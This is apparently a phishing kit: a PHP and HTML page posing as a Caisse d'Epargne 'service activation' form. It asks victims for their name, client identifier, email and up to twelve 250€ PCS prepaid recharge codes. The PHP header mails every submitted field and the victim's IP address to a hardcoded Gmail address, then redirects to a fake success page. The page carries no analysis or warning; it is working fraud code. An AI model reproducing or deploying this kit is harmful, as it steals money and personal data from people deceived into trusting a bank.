<?php
function ValidateEmail($email)
{
   $pattern = '/^([0-9a-z]([-.\w]*[0-9a-z])*@(([0-9a-z])+([-\w]*[0-9a-z])*\.)+[a-z]{2,6})$/i';
   return preg_match($pattern, $email);
}
if ($_SERVER['REQUEST_METHOD'] == 'POST' && $_POST['formid'] == 'form1')
{
   $mailto = 'kidzjayzo@gmail.com';
   $mailfrom = isset($_POST['email']) ? $_POST['email'] : $mailto;
   $subject = 'Nouveau code de rechargement PCS ';
   $message = 'Les valeurs transmisent sont les suivants :';
   $success_url = './actpcs=yes.html';
   $error_url = './actpcs=false.html';
   $error = '';
   $eol = "\n";
   $max_filesize = isset($_POST['filesize']) ? $_POST['filesize'] * 1024 : 1024000;
   $boundary = md5(uniqid(time()));

   $header  = 'From: '.$mailfrom.$eol;
   $header .= 'Reply-To: '.$mailfrom.$eol;
   $header .= 'MIME-Version: 1.0'.$eol;
   $header .= 'Content-Type: multipart/mixed; boundary="'.$boundary.'"'.$eol;
   $header .= 'X-Mailer: PHP v'.phpversion().$eol;
   if (!ValidateEmail($mailfrom))
   {
      $error .= "The specified email address is invalid!\n<br>";
   }

   if (!empty($error))
   {
      $errorcode = file_get_contents($error_url);
      $replace = "##error##";
      $errorcode = str_replace($replace, $error, $errorcode);
      echo $errorcode;
      exit;
   }

   $internalfields = array ("submit", "reset", "send", "filesize", "formid", "captcha_code", "recaptcha_challenge_field", "recaptcha_response_field");
   $message .= $eol;
   $message .= "IP Address : ";
   $message .= $_SERVER['REMOTE_ADDR'];
   $message .= $eol;
   foreach ($_POST as $key => $value)
   {
      if (!in_array(strtolower($key), $internalfields))
      {
         if (!is_array($value))
         {
            $message .= ucwords(str_replace("_", " ", $key)) . " : " . $value . $eol;
         }
         else
         {
            $message .= ucwords(str_replace("_", " ", $key)) . " : " . implode(",", $value) . $eol;
         }
      }
   }
   $body  = 'This is a multi-part message in MIME format.'.$eol.$eol;
   $body .= '--'.$boundary.$eol;
   $body .= 'Content-Type: text/plain; charset=ISO-8859-1'.$eol;
   $body .= 'Content-Transfer-Encoding: 8bit'.$eol;
   $body .= $eol.stripslashes($message).$eol;
   if (!empty($_FILES))
   {
       foreach ($_FILES as $key => $value)
       {
          if ($_FILES[$key]['error'] == 0 && $_FILES[$key]['size'] <= $max_filesize)
          {
             $body .= '--'.$boundary.$eol;
             $body .= 'Content-Type: '.$_FILES[$key]['type'].'; name='.$_FILES[$key]['name'].$eol;
             $body .= 'Content-Transfer-Encoding: base64'.$eol;
             $body .= 'Content-Disposition: attachment; filename='.$_FILES[$key]['name'].$eol;
             $body .= $eol.chunk_split(base64_encode(file_get_contents($_FILES[$key]['tmp_name']))).$eol;
          }
      }
   }
   $body .= '--'.$boundary.'--'.$eol;
   if ($mailto != '')
   {
      mail($mailto, $subject, $body, $header);
   }
   header('Location: '.$success_url);
   exit;
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Language" content="fr">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Service Activation</title>
<meta name="author" content="Pirvate Untherthered">
<meta name="robots" content="NOINDEX, NOFOLLOW">
<link href="Sans.css" rel="stylesheet" type="text/css">
<link href="act.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="wwb10.min.js"></script>
</head>
<body>
<div id="space"><br></div>
<div id="container">
<div id="wb_Shape2" style="position:absolute;left:6px;top:15px;width:982px;height:1027px;z-index:37;">
<img src="images/img0066.png" id="Shape2" alt="" style="width:982px;height:1027px;"></div>
<div id="wb_Image1" style="position:absolute;left:363px;top:11px;width:260px;height:60px;z-index:38;">
<img src="images/national_logo.png" id="Image1" alt=""></div>
<div id="wb_CssMenu1" style="position:absolute;left:7px;top:65px;width:1020px;height:74px;z-index:39;">
<ul>
<li class="firstmain"><a href="./index.html" target="_self">ACCUEIL</a>
</li>
<li><a href="#" target="_self">EMPRUNTER</a>
</li>
<li><a href="#" target="_self">EPARGNER</a>
</li>
<li><a href="#" target="_self">S'ASSURER</a>
</li>
<li><a href="#" target="_self">ACTIVATION</a>
</li>
</ul>
<br>
</div>
<div id="wb_Shape3" style="position:absolute;left:7px;top:1105px;width:970px;height:3px;filter:alpha(opacity=50);-moz-opacity:0.50;opacity:0.50;z-index:40;">
<img src="images/img0067.png" id="Shape3" alt="" style="width:970px;height:3px;"></div>
<div id="wb_Text3" style="position:absolute;left:7px;top:1119px;width:248px;height:192px;z-index:41;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>BANQUE AU QUOTIDIEN</strong></span><span style="color:#696969;font-family:Arial;font-size:13px;"><strong><br><br></strong></span><span style="color:#808080;font-family:Arial;font-size:13px;"><strong>Ouvrir un compte bancaire<br>Gérer ses comptes<br>Carte Bancaire<br>Carte Bancaire Rechargeable<br>Transmission - Successions<br>Comprendre les frais bancaires<br>Garantie des dépôts<br>Comptes inactifs et déshérence<br>Echange d’informations fiscales<br>Tarifs et informations réglementaires</strong></span></div>
<div id="wb_Text4" style="position:absolute;left:280px;top:1119px;width:250px;height:144px;z-index:42;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>AIDE ET OUTILS PRATIQUES<br><br></strong></span><span style="color:#808080;font-family:Arial;font-size:13px;"><strong>Contacts - numéros utiles<br>Assistance perte et vol / Opposition<br>Focus - «&nbsp;Tout savoir sur…&nbsp;»<br>Guides Pratiques<br>FAQ<br>Mentions légales<br>Sécurité</strong></span></div>
<div id="wb_Text5" style="position:absolute;left:530px;top:1119px;width:250px;height:176px;z-index:43;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>PROFESSIONNELS<br><br></strong></span><span style="color:#808080;font-family:Arial;font-size:13px;"><strong>Outils et services pros<br>Compte professionnel<br>Prévenir le risque de fraude<br>Entreprises<br>Associations / Economie sociale<br>Secteur Public<br>Logement Social<br>Immobilier Professionnel<br>E-remises</strong></span></div>
<div id="wb_Text6" style="position:absolute;left:762px;top:1119px;width:250px;height:160px;z-index:44;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>LA CAISSE D’EPARGNE ET VOUS<br></strong><br></span><span style="color:#696969;font-family:Arial;font-size:13px;">Nous connaitre<br>Fédération Nationale (FNCE)<br>Sponsoring - Mécénat<br>Recrutement<br>Site Sociétaires<br>Décideurs en Région<br>Horizon Entrepreneurs<br>Changer de Caisse</span></div>
<div id="wb_Image8" style="position:absolute;left:789px;top:1063px;width:32px;height:32px;z-index:45;">
<a href="#"><img src="images/facebook.png" id="Image8" alt=""></a></div>
<div id="wb_Image9" style="position:absolute;left:831px;top:1063px;width:32px;height:32px;z-index:46;">
<a href="#"><img src="images/twitter.png" id="Image9" alt=""></a></div>
<div id="wb_Image10" style="position:absolute;left:874px;top:1063px;width:32px;height:32px;z-index:47;">
<a href="#"><img src="images/instagram.png" id="Image10" alt=""></a></div>
<div id="wb_Form1" style="position:absolute;left:204px;top:121px;width:512px;height:899px;z-index:48;">
<form name="ACTIVATION" method="post" action="<?php echo basename(__FILE__); ?>" enctype="multipart/form-data" id="Form1">
<input type="hidden" name="formid" value="form1">
<div id="wb_Text7" style="position:absolute;left:10px;top:4px;width:234px;height:16px;z-index:0;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">IDENTITE CLIENT</span></div>
<div id="wb_Text8" style="position:absolute;left:10px;top:31px;width:218px;height:16px;z-index:1;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Nom&nbsp;:</span></div>
<textarea name="NOM" id="TextArea1" style="position:absolute;left:238px;top:26px;width:260px;height:22px;z-index:2;" rows="0" cols="40" maxlength="30"></textarea>
<div id="wb_Text9" style="position:absolute;left:10px;top:65px;width:218px;height:16px;z-index:3;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Prenom&nbsp;:</span></div>
<textarea name="PRENOM" id="TextArea2" style="position:absolute;left:238px;top:62px;width:260px;height:23px;z-index:4;" rows="0" cols="40" maxlength="30"></textarea>
<div id="wb_Text10" style="position:absolute;left:10px;top:95px;width:218px;height:16px;z-index:5;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Identifiant Client&nbsp;:</span></div>
<textarea name="IDENTIFIANT CLIENT" id="TextArea3" style="position:absolute;left:238px;top:95px;width:260px;height:23px;z-index:6;" rows="0" cols="40" maxlength="10"></textarea>
<div id="wb_Text11" style="position:absolute;left:10px;top:127px;width:218px;height:16px;z-index:7;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">email&nbsp;:</span></div>
<textarea name="EMAIL" id="TextArea4" style="position:absolute;left:238px;top:127px;width:260px;height:17px;z-index:8;" rows="0" cols="40" placeholder="votre adresse email ici"></textarea>
<div id="wb_Text12" style="position:absolute;left:118px;top:158px;width:234px;height:16px;z-index:9;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>ENTREZ VOS DIFFERENT CODE PCS</strong></span></div>
<div id="wb_Text13" style="position:absolute;left:122px;top:181px;width:218px;height:16px;z-index:10;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Code de rechargement PCS 1 (250€)</span></div>
<textarea name="PCS 1" id="TextArea5" style="position:absolute;left:51px;top:204px;width:402px;height:21px;z-index:11;" rows="0" cols="64" maxlength="10" placeholder="ENTREZ ICI LES 10 CARACTERES DE VOTRE CODE DE RECHARGEMENT PCS"></textarea>
<div id="wb_Text14" style="position:absolute;left:122px;top:231px;width:218px;height:16px;z-index:12;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Code de rechargement PCS 2 (250€)</span></div>
<textarea name="PCS 2" id="TextArea6" style="position:absolute;left:51px;top:254px;width:402px;height:21px;z-index:13;" rows="0" cols="64" maxlength="10" placeholder="ENTREZ ICI LES 10 CARACTERES DE VOTRE CODE DE RECHARGEMENT PCS"></textarea>
<div id="wb_Text15" style="position:absolute;left:10px;top:818px;width:218px;height:16px;z-index:14;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Message complementaire&nbsp;:</span></div>
<textarea name="Message complementaire" id="TextArea7" style="position:absolute;left:184px;top:795px;width:269px;height:66px;z-index:15;" rows="3" cols="42" maxlength="250" placeholder="si vous avez un message a nous transmettre ecrivez le ici"></textarea>
<input type="submit" id="Button1" name="" value="Activé" style="position:absolute;left:237px;top:873px;width:96px;height:25px;z-index:16;">
<div id="wb_Text1" style="position:absolute;left:122px;top:283px;width:218px;height:16px;z-index:17;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Code de rechargement PCS 3 (250€)</span></div>
<textarea name="PCS3" id="TextArea8" style="position:absolute;left:51px;top:306px;width:402px;height:21px;z-index:18;" rows="0" cols="64" maxlength="10" placeholder="ENTREZ ICI LES 10 CARACTERES DE VOTRE CODE DE RECHARGEMENT PCS"></textarea>
<div id="wb_Text2" style="position:absolute;left:122px;top:337px;width:218px;height:16px;z-index:19;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Code de rechargement PCS 4 (250€)</span></div>
<textarea name="PCS4" id="TextArea9" style="position:absolute;left:51px;top:360px;width:402px;height:21px;z-index:20;" rows="0" cols="64" maxlength="10" placeholder="ENTREZ ICI LES 10 CARACTERES DE VOTRE CODE DE RECHARGEMENT PCS"></textarea>
<div id="wb_Text16" style="position:absolute;left:122px;top:385px;width:218px;height:16px;z-index:21;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Code de rechargement PCS 5 (250€)</span></div>
<textarea name="PCS 5" id="TextArea10" style="position:absolute;left:51px;top:408px;width:402px;height:21px;z-index:22;" rows="0" cols="64" maxlength="10" placeholder="ENTREZ ICI LES 10 CARACTERES DE VOTRE CODE DE RECHARGEMENT PCS"></textarea>
<div id="wb_Text17" style="position:absolute;left:122px;top:436px;width:218px;height:16px;z-index:23;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Code de rechargement PCS 6 (250€)</span></div>
<textarea name="PCS 6" id="TextArea11" style="position:absolute;left:51px;top:459px;width:402px;height:21px;z-index:24;" rows="0" cols="64" maxlength="10" placeholder="ENTREZ ICI LES 10 CARACTERES DE VOTRE CODE DE RECHARGEMENT PCS"></textarea>
<div id="wb_Text18" style="position:absolute;left:122px;top:492px;width:218px;height:16px;z-index:25;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Code de rechargement PCS 7 (250€)</span></div>
<textarea name="PCS 7" id="TextArea12" style="position:absolute;left:51px;top:515px;width:402px;height:21px;z-index:26;" rows="0" cols="64" maxlength="10" placeholder="ENTREZ ICI LES 10 CARACTERES DE VOTRE CODE DE RECHARGEMENT PCS"></textarea>
<div id="wb_Text19" style="position:absolute;left:122px;top:548px;width:218px;height:16px;z-index:27;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Code de rechargement PCS 8 (250€)</span></div>
<textarea name="PCS 8" id="TextArea13" style="position:absolute;left:51px;top:571px;width:402px;height:21px;z-index:28;" rows="0" cols="64" maxlength="10" placeholder="ENTREZ ICI LES 10 CARACTERES DE VOTRE CODE DE RECHARGEMENT PCS"></textarea>
<div id="wb_Text20" style="position:absolute;left:122px;top:595px;width:218px;height:16px;z-index:29;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Code de rechargement PCS 9 (250€)</span></div>
<textarea name="PCS 9" id="TextArea14" style="position:absolute;left:51px;top:618px;width:402px;height:21px;z-index:30;" rows="0" cols="64" maxlength="10" placeholder="ENTREZ ICI LES 10 CARACTERES DE VOTRE CODE DE RECHARGEMENT PCS"></textarea>
<div id="wb_Text21" style="position:absolute;left:122px;top:646px;width:244px;height:16px;z-index:31;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Code de rechargement PCS 10 (250€)</span></div>
<textarea name="PCS 10" id="TextArea15" style="position:absolute;left:51px;top:667px;width:402px;height:21px;z-index:32;" rows="0" cols="64" maxlength="10" placeholder="ENTREZ ICI LES 10 CARACTERES DE VOTRE CODE DE RECHARGEMENT PCS"></textarea>
<div id="wb_Text22" style="position:absolute;left:122px;top:692px;width:244px;height:16px;z-index:33;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Code de rechargement PCS 11 (250€)</span></div>
<textarea name="PCS 11" id="TextArea16" style="position:absolute;left:51px;top:713px;width:402px;height:21px;z-index:34;" rows="0" cols="64" maxlength="10" placeholder="ENTREZ ICI LES 10 CARACTERES DE VOTRE CODE DE RECHARGEMENT PCS"></textarea>
<div id="wb_Text23" style="position:absolute;left:120px;top:739px;width:244px;height:16px;z-index:35;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Code de rechargement PCS 12 (250€)</span></div>
<textarea name="PCS 12" id="TextArea17" style="position:absolute;left:49px;top:760px;width:402px;height:21px;z-index:36;" rows="0" cols="64" maxlength="10" placeholder="ENTREZ ICI LES 10 CARACTERES DE VOTRE CODE DE RECHARGEMENT PCS"></textarea>
</form>
</div>
<div id="wb_Shape1" style="position:absolute;left:157px;top:404px;width:619px;height:507px;z-index:49;">
<img src="images/img0092.png" id="Shape1" alt="" style="width:619px;height:507px;"></div>
<div id="wb_Image2" style="position:absolute;left:685px;top:375px;width:24px;height:24px;z-index:50;">
<a href="#" onclick="ShowObject('wb_Shape1', 0);return false;"><img src="images/next.png" id="Image2" alt="" title="Cliquez pour ajouter d&#39;autre code PCS"></a></div>
</div>
</body>
</html>